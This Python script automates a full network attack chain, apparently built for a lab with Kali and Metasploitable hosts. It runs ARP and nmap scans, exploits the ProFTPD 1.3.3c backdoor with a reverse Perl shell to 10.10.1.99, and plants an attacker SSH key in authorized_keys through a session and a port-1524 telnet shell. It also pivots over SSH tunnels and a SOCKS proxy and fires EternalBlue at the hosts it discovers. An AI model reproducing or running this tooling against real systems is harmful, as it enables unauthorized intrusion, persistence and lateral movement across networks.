import subprocess
import netifaces as ni
from ipaddress import ip_interface
from scapy.all import ARP, Ether, srp
import re
import pexpect
import os
import time
from pymetasploit3.msfrpc import MsfRpcClient


def create_msf_rpc_client():
    client = MsfRpcClient('pass123', server='10.10.1.99', port=55553)
    return client

def exploit_target(client):
    exploit = client.modules.use('exploit', 'unix/ftp/proftpd_133c_backdoor')
    exploit['RHOSTS'] = '127.0.0.1'
    exploit['RPORT'] = 2121
    payload = client.modules.use('payload', 'cmd/unix/reverse_perl')
    payload['LHOST'] = '10.10.1.99'
    payload['LPORT'] = 4444
    print("Exploiting target...")
    exploit.execute(payload=payload)

def check_for_sessions(client, wait_time=90, interval=5):
    print("Waiting for available sessions...")
    start_time = time.time()
    while time.time() - start_time < wait_time:
        sessions = client.sessions.list
        if sessions:
            print("Available sessions:", sessions)
            return list(sessions.keys())[0]  # Return the first session ID.
        else:
            print("No sessions yet. Waiting...")
            time.sleep(interval)
    print("No sessions available to interact with after waiting.")
    return None

def run_command_in_session(client, session_id, command):
    if session_id is not None:
        session = client.sessions.session(session_id)

        print(f"Running command '{command}' in session {session_id}...")
        session.write(command + '\n')
        time.sleep(2)

        output = ""
        try:
            output = session.read()
            if command.startswith('arp'):
                non_gateway_ips = extract_non_gateway_ips(output)
                print("Non-gateway IPs:", non_gateway_ips)
                return non_gateway_ips
        except AttributeError:
            print("Session does not support reading. Attempting alternative read method.")

        print("Command output:", output.strip())
    else:
        print("No valid session to run commands.")
    return None



def extract_non_gateway_ips(arp_output):
    non_gateway_ips = []
    lines = arp_output.splitlines()
    for line in lines[1:]:  # Assuming the first line is a header and not data
        parts = line.split()
        ip_address = parts[0]
        # Check both conditions: starts with "10." and does not end with ".1"
        if ip_address.startswith('10.') and not ip_address.endswith('.1'):
            non_gateway_ips.append(ip_address)
    return non_gateway_ips



def setup_ssh_tunnel():
    print("Setting up SSH tunnel...")
    try:
        os.system("ssh -i /home/kali/.ssh/id_rsa -o HostKeyAlgorithms=+ssh-rsa -L 2121:192.168.1.10:21 msfadmin@10.10.1.20 -fN")
        os.system("ssh -i /home/kali/.ssh/id_rsa -o HostKeyAlgorithms=+ssh-rsa -L 2222:192.168.1.10:22 msfadmin@10.10.1.20 -fN")
        os.system("ssh -i /home/kali/.ssh/id_rsa -o HostKeyAlgorithms=+ssh-rsa -D 9050 msfadmin@10.10.1.20 -fN")
        print("SSH tunnel established.")
    except Exception as e:
        print(f"Error setting up SSH tunnel: {e}")

def get_subnet(interface='eth0'):
    addr = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
    netmask = ni.ifaddresses(interface)[ni.AF_INET][0]['netmask']
    network = ip_interface(f'{addr}/{netmask}').network
    return str(network)

def arp_scan(network, interface='eth0'):
    print(f"Scanning network: {network}")
    arp = ARP(pdst=network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result, _ = srp(packet, iface=interface, timeout=3, verbose=False)
    found_ips = []
    for sent, received in result:
        found_ips.append(received.psrc)
    return found_ips

def execute_telnet_command(ip, commands):
    try:
        child = pexpect.spawn(f'telnet {ip} 1524', timeout=20)
        child.expect('#')
        for command in commands:
            child.sendline(command)
            child.expect('#', timeout=20)

        # Add the commands after entering the telnet session
        child.sendline('netstat -ano | grep -E "\\b(192|172)\\"."')
        child.expect('#', timeout=20)
        child.sendline('echo \'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC16xdmXoJCvZsB08ehFoM8REnfl96baBNDy7mp5Yv4qAQQcZ9Lzu7Ha3Jr9GGoZ4xQVm6ed21xPtD90KusVPuVjzyTemLHbvBE2NGMi/UxwvV/Jz7OiCQQzHlPG1iD5gMfGFaEpWkl2SIV0UomyWZqtwr+EdfzgqmwdIrJQmaKVg155muVKj8uAsBzHruYwuavn8WMNApcyhxcssr5VkGaz0F6pzXc279VNw4CXkEqok6pXUy/pJEFpYMKZHFypXwZIt2fqmffcqU0TDHKQ+u6WGxJ4IGALvjx7LvvszPRq9nuzwsOR3D5o/qXnvbNpfruFj5LEFV9ljQOCxwCQmOYo0UfLhm9BKdR6gtqX5yk0SkDcVob7/AoSJeORMIq8Pniev/hUmkJVX/oVosg1Og/ltE7PAomGuWln2uehb6CoSu7z/SaIt2zxVnzd5xI1Z/KoHjBSOawkLo2G5gcoV5WR9UGjmGgfNXjsmdx/J95axUd/a8Vp2uuumfWpEG3/CtWhGRNJ+EDQzNAwp0KI/lXDqP18DOQYSTWqd7wkjdb1ru/TmAZGUHErbUVDQnVxBGnTEhtrOPEcSDUaS4JxLpQXRQd4YGHB07BharGA/LQEJqYRW0UOl2mour1QF1cYYDi1fyGyZtUSgf0uk2HsaFJi8WYQvxb0yoKslNc69ll1w== kali@kali\' >> /home/msfadmin/.ssh/authorized_keys')
        child.expect('#', timeout=20)

        child.sendline('exit')
        child.expect(pexpect.EOF)
    except pexpect.exceptions.EOF:
        print("Exited telnet session.")
    except pexpect.exceptions.TIMEOUT:
        print("Timeout during telnet session.")


def perform_loopback_nmap_scan():
    print("Performing Nmap scan on 127.0.0.1 at port 2121 with flags -A -sC -sV...")
    try:
        command = ['nmap', '-T4', '-sC', '-sV', '127.0.0.1', '-p2121']
        with open('nmap_out_ftp.txt', 'w') as f:
            nmap_result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            f.write(nmap_result.stdout)
            print("Nmap scan output saved to nmap_out_ftp.txt")
    except subprocess.CalledProcessError as e:
        print(f"Error during Nmap scan: {e}")

def nmap_scan(ip_addresses):
    exclude_ips = ['10.10.1.1', '10.10.1.10']
    ips_to_scan = [ip for ip in ip_addresses if ip not in exclude_ips]
    with open('nmap_out.txt', 'w') as outfile:
        for ip in ips_to_scan:
            print(f"Scanning {ip} for the first 2000 ports with Nmap...")
            command = ['nmap', '-sV', '-p1000-2000', '--open', ip]
            nmap_result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            outfile.write(nmap_result.stdout)


def run_proxychains_nmap(ip):
    try:
        command = f"sudo -u kali proxychains nmap -Pn -p445 --script=smb-vuln-* {ip}"
        print("Running proxychains nmap command...")
        # Running the command and capturing output
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        output = result.stdout

        # Print the output to screen
        print(output)

        # Save the output to a file
        with open('second_pivot_nmap_scan.txt', 'w') as file:
            file.write(output)

        if result.returncode != 0:
            print(f"Command failed with exit status {result.returncode}")
    except Exception as e:
        print(f"Error running proxychains nmap command: {e}")


def run_ms17_exploit(ip):
    try:
        command = f"proxychains msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {ip}; set RPORT 445; set LHOST 10.10.1.99; set LPORT 8888; exploit'"
        print("Running MS17 exploit...")

        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

        # Read output line by line and print it in real-time
        for line in process.stdout:
            print(line.strip())

        # Wait for the process to finish and get return code
        return_code = process.wait()

        # Check the return code
        if return_code != 0:
            print(f"Error running MS17 exploit. Return code: {return_code}")
    except Exception as e:
        print(f"Error running MS17 exploit: {e}")

if __name__ == "__main__":
    try:
        # Start msfrpcd
        command = "sudo -u kali msfrpcd -P pass123 -S -f -a 10.10.1.99 -p 55553"
        subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("Starting msfrpcd on port 55553...")

        network = get_subnet('eth0')
        ips = arp_scan(network)
        if ips:
            nmap_scan(ips)
            print("Nmap scan complete. Results saved to nmap_out.txt")
            client = create_msf_rpc_client()
            exploit_target(client)
            session_id = check_for_sessions(client)
            if session_id:
                run_command_in_session(client, session_id, 'hostname')
                run_command_in_session(client, session_id, "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC16xdmXoJCvZsB08ehFoM8REnfl96baBNDy7mp5Yv4qAQQcZ9Lzu7Ha3Jr9GGoZ4xQVm6ed21xPtD90KusVPuVjzyTemLHbvBE2NGMi/UxwvV/Jz7OiCQQzHlPG1iD5gMfGFaEpWkl2SIV0UomyWZqtwr+EdfzgqmwdIrJQmaKVg155muVKj8uAsBzHruYwuavn8WMNApcyhxcssr5VkGaz0F6pzXc279VNw4CXkEqok6pXUy/pJEFpYMKZHFypXwZIt2fqmffcqU0TDHKQ+u6WGxJ4IGALvjx7LvvszPRq9nuzwsOR3D5o/qXnvbNpfruFj5LEFV9ljQOCxwCQmOYo0UfLhm9BKdR6gtqX5yk0SkDcVob7/AoSJeORMIq8Pniev/hUmkJVX/oVosg1Og/ltE7PAomGuWln2uehb6CoSu7z/SaIt2zxVnzd5xI1Z/KoHjBSOawkLo2G5gcoV5WR9UGjmGgfNXjsmdx/J95axUd/a8Vp2uuumfWpEG3/CtWhGRNJ+EDQzNAwp0KI/lXDqP18DOQYSTWqd7wkjdb1ru/TmAZGUHErbUVDQnVxBGnTEhtrOPEcSDUaS4JxLpQXRQd4YGHB07BharGA/LQEJqYRW0UOl2mour1QF1cYYDi1fyGyZtUSgf0uk2HsaFJi8WYQvxb0yoKslNc69ll1w== kali@kali' >> /home/msfadmin/.ssh/authorized_keys")
                run_command_in_session(client, session_id, 'ip -br -4 a')
                non_gateway_ips = run_command_in_session(client, session_id, 'arp -n')
                if non_gateway_ips:
                    for ip in non_gateway_ips:
                        run_proxychains_nmap(ip)
                        run_ms17_exploit(ip)
        else:
            print("No IPs found to scan with Nmap.")
    except Exception as e:
        print(f"Error occurred: {e}")
